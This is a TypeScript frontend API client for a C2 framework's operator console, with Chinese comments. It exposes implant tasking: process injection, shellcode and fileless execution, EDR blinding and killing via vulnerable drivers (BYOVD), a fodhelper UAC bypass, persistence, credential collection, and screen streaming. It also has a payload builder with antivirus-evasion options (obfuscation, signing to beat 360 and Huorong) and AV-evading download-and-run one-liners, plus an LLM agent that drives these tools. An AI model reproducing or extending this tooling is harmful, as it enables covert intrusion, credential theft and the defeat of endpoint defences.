import axios from 'axios'
import type { Session, Task, TaskStats, LogEntry, TaskRequest, ListenerInfo } from '../types'

export interface Tunnel {
  id: number
  target_addr: string
  target_port: number
  active: boolean
  created_at: string
  bytes_in: number
  bytes_out: number
  session_id?: string
  local_port?: number
}

const api = axios.create({
  baseURL: '/api/v1',
  timeout: 120000, // 2分钟，兼容 spawn 模式编译 EXE
  headers: {
    'Content-Type': 'application/json',
  },
})

api.interceptors.request.use((config) => {
  const token = localStorage.getItem('toshell-token')
  if (token) {
    config.headers.Authorization = `Bearer ${token}`
  }
  return config
})

api.interceptors.response.use(
  (response) => response,
  (error) => {
    if (error.response?.status === 401) {
      localStorage.removeItem('toshell-token')
      window.location.href = '/login'
    }
    return Promise.reject(error)
  }
)

export const authApi = {
  login: (username: string, password: string) =>
    api.post<{ token: string; username: string }>('/login', { username, password }),
  logout: () => api.post('/logout'),
  verify: () => api.get('/verify'),
}

export const sessionApi = {
  list: () => api.get<{ sessions: Session[]; count: number }>('/sessions'),
  get: (id: string) => api.get<Session>(`/sessions/${id}`),
  update: (id: string, comment: string) => api.patch(`/sessions/${id}`, { comment }),
  delete: (id: string) => api.delete(`/sessions/${id}`),
  /** 会话能力清单：可用功能/操作面板（按 OS+通道推导） */
  getCapabilities: (id: string) => api.get<{ tabs: Record<string, boolean>; features: string[] }>(`/sessions/${id}/capabilities`),
  interact: (id: string, command: string, taskType?: string) => 
    api.post(`/sessions/${id}/interact`, { command, task_type: taskType || 'command' }),
  listFiles: (id: string, path: string) => 
    api.get(`/sessions/${id}/files`, { params: { path } }),
  downloadFile: (id: string, path: string) => 
    api.post(`/sessions/${id}/files/download`, { path }),
  deleteFile: (id: string, path: string) => 
    api.post(`/sessions/${id}/files/delete`, { path }),
  uploadFile: (id: string, payload: {
    upload_id: string
    filename: string
    path: string
    size: number
    offset: number
    data: string
    done: boolean
  }) =>
    api.post(`/sessions/${id}/files/upload`, payload),
  listProcesses: (id: string) => 
    api.get(`/sessions/${id}/processes`),
  killProcess: (id: string, pid: number) => 
    api.delete(`/sessions/${id}/processes/${pid}`),
  processInject: (id: string, method: string, pid: number, shellcode?: string, dllPath?: string) =>
    api.post(`/sessions/${id}/inject`, { method, pid, shellcode, dll_path: dllPath }),
  processInjection: (id: string, data: {
    method: string
    target_pid?: number | null
    target_path?: string | null
    payload?: string
    use_default_payload?: boolean
  }) =>
    api.post<{ task_id: number; message: string }>(`/sessions/${id}/process-injection`, data),
  loadBof: (id: string, data: string, args?: string) =>
    api.post(`/sessions/${id}/bof`, { data, args }),
  /** 实时屏幕流：可传帧率/画质/带宽/显示器等参数（服务端校验后透传植入端） */
  screenStream: (
    id: string,
    action: 'start' | 'stop',
    params?: { fps?: number; quality?: number; max_kbps?: number; monitor?: number; max_width?: number; format?: string },
  ) =>
    api.post<{ task_id: number; task_type: string; action: string; params?: Record<string, number | string>; message: string }>(
      `/sessions/${id}/screen-stream`,
      { action, ...(params || {}) },
    ),
  relay: (id: string, action: 'start' | 'stop' | 'status', addr?: string) =>
    api.post<{ task_id: number; task_type: string; action: string; addr: string; message: string }>(`/sessions/${id}/relay`, { action, addr }),
  listRelayNodes: () =>
    api.get<{ relay_nodes: RelayNode[]; count: number }>('/relay-nodes'),
  edrBlind: (id: string) =>
    api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/blind`, {}),
  edrKill: (id: string, processes?: string[]) =>
    api.post<{ task_id: number; task_type: string; count: number; message: string }>(`/sessions/${id}/edr/kill`, { processes }),
  byovdLoad: (id: string, payload: { driver_b64: string; service_name?: string; device_name?: string; name?: string; kill_ioctl?: string; description?: string }) =>
    api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/byovd-load`, payload),
  byovdUnload: (id: string, serviceName?: string) =>
    api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/byovd-unload`, { service_name: serviceName }),
  /** BYOVD 驱动击杀：按 PID 或进程名调用内置驱动的无鉴权终止 IOCTL */
  byovdKill: (id: string, payload: { pid?: number; process_name?: string; driver?: string; device?: string; ioctl?: string }) =>
    api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/byovd-kill`, payload),
  pplKill: (id: string, processes?: string[]) =>
    api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/ppl-kill`, { processes }),
  filelessExec: (id: string, payload: {
    kind: 'shellcode' | 'bof' | 'dll' | 'exe' | 'exe_mem'
    payload_b64: string
    args?: string
    entry?: string
    arch?: string
    /** exe_mem：等待执行线程结束的毫秒数（0/省略 = 不等待） */
    wait_ms?: number
    /** 服务端 PE 预检判定为 reject 时，勾选此项强制下发（高危，服务端会记日志留痕） */
    force?: boolean
  }) =>
    api.post<{
      task_id: number
      task_type: string
      kind: string
      args?: string
      message: string
      /** 预检 warn/reject 降级后的风险提示（任务已下发） */
      warnings?: string[]
      /** 处置建议（改用落地执行 / donut / shellcode 等） */
      suggestion?: string
      /** 预检结论：ok / warn / reject */
      preflight_verdict?: string
      /** 精简 PE 指纹，便于操作员核对 */
      pe_info?: {
        machine?: string
        is_64bit?: boolean
        is_dll?: boolean
        has_tls?: boolean
        has_clr?: boolean
        is_go?: boolean
      }
    }>(`/sessions/${id}/fileless-exec`, payload),
  // UAC 提权：fodhelper 拉起高完整性进程，内存执行 shellcode 回连上线
  privescUAC: (id: string) =>
    api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/privesc-uac`),
}

export const tunnelApi = {
  list: () => api.get<{ servers: SOCKS5ServerInfo[]; count: number }>('/tunnels'),
  create: (session_id: string, local_port: number) => 
    api.post('/tunnels', { session_id, local_port }),
  delete: (sessionId: string) => api.delete(`/tunnels/${sessionId}`),
}

export interface RelayNode {
  session_id: string
  hostname: string
  addr: string
  host: string
  port: string
}

export interface BuiltinDriver {
  name: string
  description: string
  /** 用途：kill = 无鉴权进程终止 */
  purpose?: string
  device: string
  service: string
  /** 终止进程的 IOCTL 码（METHOD_BUFFERED，入参首个 DWORD = PID） */
  ioctl?: number
  kill_pid_size?: number
  size: number
  sha256: string
  /** 签名者（来自 manifest 的人工标注，字符串；实测结论见 verify.signer） */
  signed?: string
  /** 加载前自检结论（服务端 WinVerifyTrust + manifest sha256 一致性 + 黑名单策略提示） */
  verify?: DriverVerifyResult
}

/** 驱动加载前自检结论（对应服务端 drivers.VerifyResult） */
export interface DriverVerifyResult {
  sha256: string
  manifest_sha256?: string
  /** manifest 声明了期望哈希时，实际内容是否一致；false = 服务端会拒绝下发 */
  hash_ok: boolean
  /** 本机 WinVerifyTrust 是否校验通过 */
  signed: boolean
  /** 是否真的做过签名校验（非 Windows 或超时会为 false） */
  signature_checked: boolean
  /** 签名者简单显示名（取不到时为空） */
  signer?: string
  /** 本机是否启用了微软易受攻击驱动黑名单策略 */
  blocklisted: boolean
  blocklist_reason?: string
  warnings?: string[]
  errors?: string[]
  /** 一句话中文结论 */
  summary?: string
}

// BYOVD 驱动：由操作员自备（服务端不内置任何驱动），放 drivers/ 或 data/drivers/ + manifest.json
export const driversApi = {
  list: () => api.get<{ drivers: BuiltinDriver[]; count: number }>('/drivers'),
  raw: async (name: string) => {
    const r = await api.get<ArrayBuffer>(`/drivers/${encodeURIComponent(name)}/raw`, { responseType: 'arraybuffer' })
    return r.data
  },
  /** 单独查询某个驱动的加载前自检结论 */
  verify: (name: string) => api.get<DriverVerifyResult & { ok: boolean }>(`/drivers/${encodeURIComponent(name)}/verify`),
}

// 运行时设置（设置页真实读写，保存后热生效）
export interface SettingsResponse {
  general: Record<string, unknown>
  listener: Record<string, unknown>
  implant: Record<string, unknown>
  notifications: Record<string, unknown>
  security: Record<string, unknown>
}
export const settingsApi = {
  get: () => api.get<SettingsResponse>('/settings'),
  save: (updates: Record<string, unknown>) =>
    api.put<{ message: string; hot: boolean }>('/settings', updates),
  testWebhook: (payload: { url: string; content?: string; format?: string; secret?: string }) =>
    api.post<{ ok: boolean; platform?: string; status_code: number; response: string; error?: string }>(
      '/settings/webhook/test',
      payload,
    ),
}

export interface SOCKS5ServerInfo {
  session_id: string
  local_port: number
  tunnels: Tunnel[]
}

export interface Plugin {
  id: string
  name: string
  description: string
  type: string
  size: number
  path: string
  created_at: string
  updated_at: string
}

export const pluginApi = {
  list: () => api.get<{ plugins: Plugin[]; count: number }>('/plugins'),
  get: (id: string) => api.get<Plugin>(`/plugins/${id}`),
  upload: (file: File, description?: string) => {
    const formData = new FormData()
    formData.append('file', file)
    if (description) {
      formData.append('description', description)
    }
    return api.post<Plugin>('/plugins', formData, {
    headers: { 'Content-Type': 'multipart/form-data' },
    })
  },
  delete: (id: string) => api.delete(`/plugins/${id}`),
  refresh: () => api.post<{ plugins: Plugin[]; count: number }>('/plugins/refresh'),
  load: (sessionId: string, pluginId: string, args?: string) => 
    api.post<{ task_id: number; plugin: Plugin; status: string; message: string }>(`/sessions/${sessionId}/plugin`, { 
      plugin_id: pluginId, 
      args: args || '' 
    }),
}



export const taskApi = {
  list: () => api.get<Task[]>('/tasks'),
  get: (id: number) => api.get<Task>(`/tasks/${id}`),
  create: (data: TaskRequest) => api.post<Task>('/tasks', data),
  delete: (id: number) => api.delete(`/tasks/${id}`),
  cancel: (id: number) => api.post(`/tasks/${id}/cancel`),
  stats: () => api.get<{ stats: TaskStats }>('/tasks/stats'),
}

export const logApi = {
  list: (limit?: number, level?: string) => 
    api.get<{ logs: LogEntry[]; count: number }>('/logs', { 
      params: { limit, level } 
    }),
}

export const systemApi = {
  stats: () => api.get('/system/stats'),
  health: () => api.get('/health'),
}

export interface ListenerPayload {
  name: string
  type: string
  protocol: string
  bind_addr: string
  bind_port: number
  public_addr?: string
}

export const listenerApi = {
  list: () => api.get<{ listeners: ListenerInfo[]; count: number }>('/listeners'),
  create: (data: ListenerPayload) => api.post<ListenerInfo>('/listeners', data),
  update: (id: string, data: ListenerPayload) => api.put<ListenerInfo>(`/listeners/${id}`, data),
  get: (id: string) => api.get<ListenerInfo>(`/listeners/${id}`),
  start: (id: string) => api.post<{ id: string; status: string; message: string }>(`/listeners/${id}/start`),
  stop: (id: string) => api.post<{ id: string; status: string; message: string }>(`/listeners/${id}/stop`),
  delete: (id: string) => api.delete<{ message: string }>(`/listeners/${id}`),
}

export interface BuildRequest {
  name: string
  format: string
  /** 植入端语言：go(默认,全功能) / c(C 植入端,体积极小,仅 Windows) */
  language?: string
  listener_id: string
  server_url: string
  protocol: string
  /**
   * 心跳间隔（秒）。**留空/0 = 跟随服务端配置**（「设置 → 植入端默认参数」里的
   * `implant.interval`，未配置时回退 60s）。构建页输入框留空即发 0。
   */
  interval: number
  /** 抖动（%）。**留空/0 = 跟随服务端配置**（`implant.jitter`，未配置时回退 20%）。 */
  jitter: number
  /** 重试次数。**留空/0 = 用默认值 3**（该项没有服务端配置项）。 */
  retry_count: number
  /** 重试间隔（秒）。**留空/0 = 跟随服务端配置**（`implant.retry_wait`，未配置时回退 5s）。 */
  retry_wait: number
  kill_date: string
  working_hours: string
  relay_listen?: string
  front_domain?: string
  profile?: string
  output_path: string
  os: string
  arch: string
  /** 一键上线命令中的下载地址（可选）：留空由服务端按 public_host/控制台地址自动解析 */
  download_host?: string
  // Evasion options
  xor_encrypt?: boolean
  xor_key_size?: number
  garble_enabled?: boolean
  upx_enabled?: boolean
  /**
   * 主动反沙箱进程检测（默认关闭）：启动时枚举进程并与安全软件/分析工具进程名
   * 比对，命中则延迟执行。国产杀软（360/火绒/电脑管家）主动防御会拦截该对抗行为，
   * 且会把 toolhelp32 导入与进程名字符串写进载荷，故默认不编译。
   */
  evasion_scan?: boolean
  /**
   * BOF 支持（默认关闭）：开启会带上整套 Cobalt Strike Beacon API 名字
   * （BeaconDataParse/BeaconOutput…，实测 22 处 pclntab 明文），只在需要跑 BOF 时开。
   */
  bof_enabled?: boolean
  /**
   * 构建后代码签名（Authenticode）：证书配置在服务端 builder.sign_*，这里只能开启。
   * 未签名的新 PE 在装有 360/电脑管家的主机上会被拒绝执行并删除。
   */
  sign_enabled?: boolean
  /** DLL 载荷（format=dll）：导出函数名（rundll32 payload.dll,<名字>；留空=Start） */
  dll_export?: string
  /** DLL 载荷是否"加载即启动"（白加黑场景宿主不一定调用我们的导出函数，默认 true） */
  dll_autostart?: boolean
  /** 启动随机延迟（秒）：留空用服务端配置（implant.startup_delay_min/max） */
  startup_delay_min?: number
  startup_delay_max?: number
}

export interface BuildResponse {
  id: string
  name: string
  format: string
  size: number
  sha256: string
  build_time: string
  download_url: string
  /** 一条命令上线：复制到目标机执行即可静默下载并运行载荷（exe/raw 生效） */
  one_liner?: string
  /** 一条命令上线实际使用的下载主机（host[:port]），由服务端解析 */
  one_liner_host?: string
  /** 一条命令上线使用的下载基址（如 https://c2.example.com） */
  one_liner_base?: string
  /** 非空表示下载地址可能对目标机不可达（回环/仅内网），需提示运维 */
  one_liner_warning?: string
  /** 多条免杀上线命令变体（PowerShell/BITS/LOLBin/curl/python 等） */
  one_liners?: OneLinerVariant[]
  /** 产物是否带有效 Authenticode 签名（启用代码签名时才有意义） */
  signed?: boolean
  /** 签名者主题（如 CN=xxx, O=yyy） */
  signer?: string
  /** 实际使用的签名方式：powershell / signtool / none */
  sign_method?: string
  /** 签名复核状态：Valid / NotSigned / UnknownError … */
  sign_status?: string
  /** 中文说明（未签名的原因 / 失败原因） */
  sign_message?: string
  /** 落地链建议标题（按平台/格式 + 是否已签名给出"该走哪条链"） */
  loader_advice_title?: string
  /** 落地链建议要点，顺序即优先级（直接运行 → 计划任务 → 白加黑 → 内存加载） */
  loader_advice_tips?: string[]
}

/** 一条命令上线的单个变体：由服务端生成，前端只做展示与复制 */
export interface OneLinerVariant {
  /** 变体名，如 "PowerShell · Base64 编码" */
  name: string
  os: string
  /** 解释器：PowerShell / CMD / Shell */
  shell: string
  /** 手法与适用场景说明 */
  desc: string
  command: string
  /** 加载器链的补充说明：前置条件 / 占位符含义 / 国产杀软下的风险等级 */
  note?: string
}

/** 一键上线命令集合：含下载地址解析结果与不可达告警 */
export interface OneLinerSet {
  host: string
  base_url: string
  warning?: string
  variants: OneLinerVariant[]
  /** 该载荷格式不支持一条命令上线时的说明 */
  error?: string
}

export interface BuilderInfo {
  formats: string[]
  protocols: string[]
  os: string[]
  arch: string[]
  listeners: ListenerInfo[]
  /** 植入端语言能力：go 恒可用，c 依赖服务端 mingw gcc */
  languages?: {
    go: boolean
    c: boolean
    c_message?: string
  }
  options: {
    interval: { min: number; max: number; default: number }
    jitter: { min: number; max: number; default: number }
    retry_count: { min: number; max: number; default: number }
    retry_wait: { min: number; max: number; default: number }
  }
  /**
   * 服务端「设置 → 植入端默认参数」里的**当前生效值**（服务端已按构建时的归一化
   * 规则算好）。生成载荷页把它们显示成对应输入框的 placeholder：留空 = 跟随服务端，
   * 这样就不用"设置里配一遍、构建页再填一遍"。
   */
  implant_defaults?: {
    interval?: number
    jitter?: number
    retry_count?: number
    retry_wait?: number
    startup_delay_min?: number
    startup_delay_max?: number
  }
  evasion?: {
    garble_available: boolean
    /** garble 不可用的原因（或可用时的路径说明） */
    garble_message?: string
    upx_available: boolean
    /** 服务端是否已配好代码签名证书（builder.sign_enabled + pfx/指纹） */
    sign_configured?: boolean
    /** 代码签名的配置说明（未配置原因 / 使用的证书与签名栈） */
    sign_message?: string
    /** BOF 默认是否编译进载荷（恒为 false：需要时在页面勾选） */
    bof_default?: boolean
    /** 本机能否为 amd64 构建真正的 DLL（兼容字段；按架构判断请用 dll_arch） */
    dll_available?: boolean
    /** DLL 能力说明（不可用时给出安装哪种 gcc） */
    dll_message?: string
    /** 按目标架构分别给出 DLL 能力：c-shared 需要与架构一致的 mingw gcc */
    dll_arch?: Record<string, { available: boolean; message: string }>
  }
}

export const builderApi = {
  list: () => api.get<BuilderInfo>('/builders'),
  create: (data: BuildRequest) => api.post<BuildResponse>('/builders', data),
  download: (data: BuildRequest) => api.post('/builders/download', data, {
    responseType: 'blob',
  }),
}

export interface InjectionMethod {
  name: string
  description: string
  requires_pid: boolean
  requires_path: boolean
  requires_shellcode: boolean
  requires_dll: boolean
}

export interface InjectionRequest {
  method: string
  target_pid?: number
  target_process_name?: string
  target_path?: string
  shellcode?: string
  dll_path?: string
  parent_pid?: number
}

export const injectionApi = {
  listMethods: () => api.get<{ methods: InjectionMethod[]; count: number }>('/injection/methods'),
  execute: (sessionId: string, data: InjectionRequest) =>
    api.post<{ task_id: number; task_type: string; method: string; message: string }>(`/sessions/${sessionId}/injection`, data),
}

export interface PersistenceMethod {
  name: string
  description: string
  reliable: boolean
}

export const persistenceApi = {
  listMethods: (sessionId: string) =>
    api.get<{ task_id: number; message: string }>(`/sessions/${sessionId}/persistence`),
  install: (sessionId: string, method: string) =>
    api.post<{ task_id: number; method: string; message: string }>(`/sessions/${sessionId}/persistence/install`, { method }),
  remove: (sessionId: string) =>
    api.post<{ task_id: number; message: string }>(`/sessions/${sessionId}/persistence/remove`, {}),
}

export const credentialApi = {
  collect: (sessionId: string, action: string = 'all') =>
    api.post(`/sessions/${sessionId}/credentials`, { action }),
}

export const screenshotApi = {
  take: (sessionId: string) =>
    api.post<{ task_id: number; message: string }>(`/sessions/${sessionId}/screenshot`),
  getResult: (taskId: number) =>
    api.get<{ output?: string; error?: string; status: string }>(`/tasks/${taskId}`),
}

export const templateApi = {
  list: () => api.get('/templates'),
  get: (id: string) => api.get(`/templates/${id}`),
  create: (data: { name: string; description: string; category: string; tasks: any[] }) =>
    api.post('/templates', data),
  update: (id: string, data: { name: string; description: string; category: string; tasks: any[] }) =>
    api.put(`/templates/${id}`, data),
  delete: (id: string) => api.delete(`/templates/${id}`),
  execute: (sessionId: string, templateId: string) =>
    api.post(`/sessions/${sessionId}/workflow`, { template_id: templateId }),
  getWorkflow: (id: string) => api.get(`/workflows/${id}`),
}

export interface CopilotTrace {
  name: string
  args?: Record<string, string>
  result?: string
  error?: string
}

// 副驾驶工具审批请求（normal 权限模式下影响会话的操作需用户确认）
export interface ConsentReq {
  token: string
  tool: string
  args?: Record<string, string>
  desc?: string
}

// AI 副驾驶：LLM 聊天 + 工具调用（端点 /copilot/status /copilot/chat /copilot/consent）
export const copilotApi = {
  status: () =>
    api.get<{ enabled: boolean; model: string; consent_policy?: string; consent_mode?: string; notice?: string }>(
      '/copilot/status',
    ),
  // v1.4.0 S2：/copilot/chat 与 /copilot/consent 的响应新增 trace_id / stop_reason
  // （stop_reason: max_turns / max_tool_calls / max_wallclock / loop_detected / awaiting_consent）
  chat: (messages: { role: string; content: string }[]) =>
    api.post<{ reply: string; traces: CopilotTrace[]; pending_consents?: ConsentReq[]; trace_id?: string; stop_reason?: string }>('/copilot/chat', { messages }, { timeout: 240000 }),
  consent: (token: string, decision: 'allow' | 'deny') =>
    api.post<{ reply: string; traces: CopilotTrace[]; pending_consents?: ConsentReq[]; trace_id?: string; stop_reason?: string }>('/copilot/consent', { token, decision }, { timeout: 240000 }),
  playbooks: () => api.get<{ playbooks: Playbook[]; count: number }>('/copilot/playbooks'),
  runPlaybook: (playbook_id: string, session_id: string) =>
    api.post<{ run_id: string; status: string }>('/copilot/playbook/run', { playbook_id, session_id }),
  playbookRuns: () => api.get<{ runs: PlaybookRun[]; count: number }>('/copilot/playbook/runs'),
  playbookRun: (id: string) => api.get<PlaybookRun>(`/copilot/playbook/runs/${id}`),
}

// ─── 异步自主 Agent ─────────────────────────────────────────────────
// 非阻塞：agentChat 立即返回 run_id，事件经 SSE 流式推送，可实时渲染思考与工具步骤。
export const agentApi = {
  /** 创建/续接异步 agent run（立即返回 run_id+session_id，不卡对话）。session_id 用于续接同一自主记忆上下文。 */
  chat: (messages: { role: string; content: string }[], sessionId?: string) =>
    api.post<{ run_id: string; session_id: string; status: string }>('/agent/chat', sessionId ? { messages, session_id: sessionId } : { messages }),
  /** 查询 run 状态/目标/计划/轨迹/时间线/最终答复 */
  status: (runId: string) => api.get<{ run_id: string; status: string; objective?: string; plan?: { index: number; desc: string; status: string }[]; traces: CopilotTrace[]; timeline?: { ts: number; kind: string; text: string }[]; reply: string }>(`/agent/runs/${runId}`),
  /** 取消 run */
  cancel: (runId: string) => api.post<{ run_id: string; status: string }>(`/agent/runs/${runId}/cancel`),
  /** 处理审批：allow/deny */
  consent: (runId: string, decision: 'allow' | 'deny') =>
    api.post<{ run_id: string; status: string }>(`/agent/runs/${runId}/consent`, { decision }),
  /** SSE 事件流：thinking / message / tool_start / tool_result / final / done / status */
  events: (runId: string, onEvent: (ev: AgentStreamEvent) => void, onDone: () => void) =>
    streamAgent(runId, onEvent, onDone),
}

export interface AgentStreamEvent {
  event: string
  data: any
}

// streamAgent 用 fetch + ReadableStream 消费 SSE（axios 无法流式，故用原生 fetch）。
async function streamAgent(runId: string, onEvent: (ev: AgentStreamEvent) => void, onDone: () => void) {
  const url = `/api/v1/agent/runs/${runId}/events`
  try {
    const resp = await fetch(url, {
      headers: authHeaders(),
      signal: undefined,
    })
    if (!resp.body) throw new Error('no stream body')
    const reader = resp.body.getReader()
    const decoder = new TextDecoder()
    let buf = ''
    let done = false
    while (!done) {
      const { value, done: d } = await reader.read()
      done = d
      buf += decoder.decode(value || new Uint8Array(), { stream: !done })
      // 解析 SSE：按 \n\n 切分事件块
      let idx: number
      while ((idx = buf.indexOf('\n\n')) >= 0) {
        const block = buf.slice(0, idx)
        buf = buf.slice(idx + 2)
        const ev = parseSSEBlock(block)
        if (ev) {
          onEvent(ev)
          if (ev.event === 'done' || ev.event === 'error' || (ev.event === 'state' && ev.data?.done)) {
            onDone()
            return
          }
        }
      }
    }
    onDone()
  } catch (e) {
    onEvent({ event: 'error', data: { error: (e as Error).message } })
    onDone()
  }
}

function parseSSEBlock(block: string): AgentStreamEvent | null {
  let event = 'message'
  let data = ''
  for (const line of block.split('\n')) {
    if (line.startsWith('event:')) event = line.slice(6).trim()
    else if (line.startsWith('data:')) data += line.slice(5).trim()
  }
  if (!data) return null
  try {
    return { event, data: JSON.parse(data) }
  } catch {
    return { event, data }
  }
}

// authHeaders 复用与 axios 相同的认证头（从 localStorage 取 token）。
function authHeaders(): Record<string, string> {
  const h: Record<string, string> = { 'Content-Type': 'text/event-stream' }
  const token = localStorage.getItem('toshell-token')
  if (token) h['Authorization'] = `Bearer ${token}`
  return h
}

export interface Playbook {
  id: string
  name: string
  desc: string
  steps: { name: string; tool: string }[]
  fallback: string
}
export interface PlaybookRun {
  id: string
  playbook: string
  session_id: string
  status: string
  results: { name: string; tool: string; status: string; output?: string; error?: string; task_id?: number }[]
  created_at: number
  analysis?: string
  batch_id?: string
}

// 通道健康：TCP/HTTP/WS/MQTT 四通道在线数/监听器数
export interface ChannelHealth {
  type: string
  online: number
  total_session: number
  listeners: number
  running: boolean
}
export const channelsApi = {
  health: () => api.get<{ channels: ChannelHealth[]; total_online: number; total_session: number }>('/channels/health'),
}

export default api
